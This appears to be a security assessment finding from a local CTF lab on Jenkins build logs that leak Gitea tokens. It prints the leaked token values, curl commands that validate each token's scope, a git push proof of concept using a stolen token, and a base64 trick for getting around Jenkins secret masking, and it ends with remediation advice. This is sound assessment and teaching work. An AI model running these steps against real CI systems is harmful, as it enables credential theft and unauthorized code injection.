# F-010: Secrets Exposure in Jenkins Build Console Logs

**SEVERITY: CRITICAL**

| Field | Detail |
|---|---|
| Affected Asset | Jenkins job `wonderland-white-rabbit` (Multibranch Pipeline, PR-1) |
| OWASP CI/CD Mapping | **CICD-SEC-6** (Insufficient Credential Hygiene) — primary · CICD-SEC-4 (Poisoned Pipeline Execution) — trigger vector · CICD-SEC-2 (Inadequate IAM) — contributing factor (token scope) |
| CVSS 3.1 (estimate) | 9.1 (Critical) — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| Status | CONFIRMED — full chain reproduced via live PoC |
| CTFd flags | flag1, flag2 |

## Summary

The white-rabbit pipeline's Jenkinsfile contains a debug-oriented stage named `Dump_Env` that runs the shell `env` command and prints the entire process environment to the build console log. This log is readable by any account with basic `Job/Read` permission on the job — critically, this includes builds triggered by pull requests, meaning an external contributor who can open a PR gains a build whose console output they can then read. The leaked environment contained two live, functional Gitea access tokens, one of which was confirmed to have push (write) access to a separate repository, enabling a fully weaponized proof-of-concept: unauthorized code injection that Jenkins then automatically built.

## Discovery Steps

### Step 1 — Reading the PR-1 build console log

```bash
curl -s -u alice:alice "http://localhost:8080/job/wonderland-white-rabbit/job/PR-1/lastBuild/wfapi/describe" \
  -o white-rabbit_PR-1_wfapi.json
curl -s -u alice:alice "http://localhost:8080/job/wonderland-white-rabbit/job/PR-1/lastBuild/consoleText" \
  -o white-rabbit_PR-1_console.txt
cat white-rabbit_PR-1_console.txt
```

Relevant excerpt from the console log (`Dump_Env` stage):

```
[Pipeline] stage
[Pipeline] { (Dump_Env)
[Pipeline] sh
+ env
JENKINS_HOME=/var/jenkins_home
...
GIT_URL=http://a644940c92efe2d1876e16a5d29e6c6d7e199b68@gitea:3000/Wonderland/white-rabbit.git
...
GITEA_TOKEN=5d3ed5564341d5060c8524c41fe03507e296ca46
...
CHANGE_URL=http://gitea:3000/Wonderland/white-rabbit/pulls/1
CHANGE_BRANCH=thealice-patch-1
```

Two distinct credentials were exposed here: an explicit named variable (`GITEA_TOKEN`) and a second, different token embedded directly in the SCM checkout URL (`GIT_URL`) — meaning this single stage leaked two separate service-account tokens.

### Step 2 — Validating both tokens against Gitea's API

```bash
curl -s -H "Authorization: token 5d3ed5564341d5060c8524c41fe03507e296ca46" \
  http://localhost:3000/api/v1/user | jq .
curl -s -H "Authorization: token a644940c92efe2d1876e16a5d29e6c6d7e199b68" \
  http://localhost:3000/api/v1/user | jq .
```

Result: token 1 resolved to account `jenkins_caterpillar`; token 2 resolved to a generic service account, `jenkins`. Both tokens were live and functional — not placeholder/expired values.

### Step 3 — Enumerating scope and permissions

```bash
curl -s -H "Authorization: token 5d3ed5564341d5060c8524c41fe03507e296ca46" \
  http://localhost:3000/api/v1/user/repos | jq -r '.[].full_name'
curl -s -H "Authorization: token 5d3ed5564341d5060c8524c41fe03507e296ca46" \
  http://localhost:3000/api/v1/repos/Wonderland/caterpillar | jq '{permissions, private}'
curl -s -H "Authorization: token a644940c92efe2d1876e16a5d29e6c6d7e199b68" \
  http://localhost:3000/api/v1/user/repos | jq -r '.[].full_name'
```

| Token / Identity | Confirmed Scope |
|---|---|
| `jenkins_caterpillar` | `push: true, pull: true` on `Wonderland/caterpillar` (public repo) |
| `jenkins` (generic) | `pull: true` only (`push: false`) on 4 private repos: cheshire-cat, mad-hatter, mock-turtle, white-rabbit |

> **Discipline note:** the generic `jenkins` token was initially assumed to also carry write access across all four private repos it could read. Direct permission-object checks corrected this to read-only — always validate the exact `permissions` object rather than inferring capability from repo visibility alone.

## Proof of Concept — Full Exploitation Chain

The `jenkins_caterpillar` token's confirmed push access was used to demonstrate complete real-world impact: unauthorized code injection that automatically executes via the CI pipeline.

```bash
# Step 1 - Clone target repo using the leaked token as credentials
git clone http://jenkins_caterpillar:5d3ed5564341d5060c8524c41fe03507e296ca46@localhost:3000/Wonderland/caterpillar.git poc_caterpillar
cd poc_caterpillar

# Step 2 - Commit a clearly-marked, non-destructive PoC file
cat > VAPT_POC_F010.md << 'EOF'
# VAPT PoC - Finding F-010
This file was committed as part of an authorized local security assessment
to demonstrate unauthorized push access via a leaked Gitea token.
EOF
git add VAPT_POC_F010.md
git -c user.name="VAPT-PoC" -c user.email="poc@vapt.local" \
  commit -m "VAPT PoC F-010: demonstrating unauthorized push via leaked token"

# Step 3 - Push using the stolen token
git push origin HEAD
```

Jenkins automatically built the pushed commit, confirming the complete PR-to-secret-theft-to-unauthorized-write chain.

### CTFd-verified flag capture (flag1, flag2)

CTFd's own challenge descriptions (White Rabbit, Caterpillar) confirmed the objective was exactly this: steal a Jenkins-credential-store-backed flag using this technique. Both `flag1` and `flag2` were bound via `withCredentials()` in the respective pipelines and were recovered by encoding the value (base64) before printing it to console — bypassing Jenkins' string-pattern console masking, which only redacts an *exact* literal match of the secret value, not any transformed/encoded representation of it.

## Impact

- Any external contributor able to open a pull request against `white-rabbit` gains a build whose console log they can read, and that log leaks two live, distinct service-account credentials.
- One of the two credentials had confirmed write access to a separate, public repository — allowing unauthorized code injection that Jenkins automatically builds, a complete PR-to-RCE style chain.
- Console masking (`withCredentials()`) protects against *literal* value leakage, but not against a value being encoded/transformed before being printed.

## Remediation

- Remove or redact the `Dump_Env` (or any raw `env`/`printenv`) debug stage from any pipeline reachable by external/PR-triggered builds.
- Rotate both tokens (`jenkins_caterpillar`, generic `jenkins`) immediately.
- Scope every CI credential to the minimum single repo/purpose required — the contrast between `jenkins_caterpillar`'s single-repo scope and the generic `jenkins` token's four-repo scope is a useful illustration of blast-radius reduction via least privilege.
- Require manual approval for first-time/untrusted PR contributors before Jenkins builds their code at all.
- Adopt automated secret-scanning of build console **output**, not just source code — this class of leak never touches a repository.

## Interview Talking Points

- This is a complete PR-to-RCE style chain, not a theoretical leak: leaked credential → validated scope → weaponized push → automatic CI execution of unauthorized code.
- A good example of why encoding-based masking bypass (base64, hex, etc.) matters: Jenkins' credential masking is a literal string match against console output, easily defeated by transforming the value before printing it.
- Illustrates the value of validating exact permission objects (`push`/`pull` booleans) rather than inferring capability from what a token *can see*.
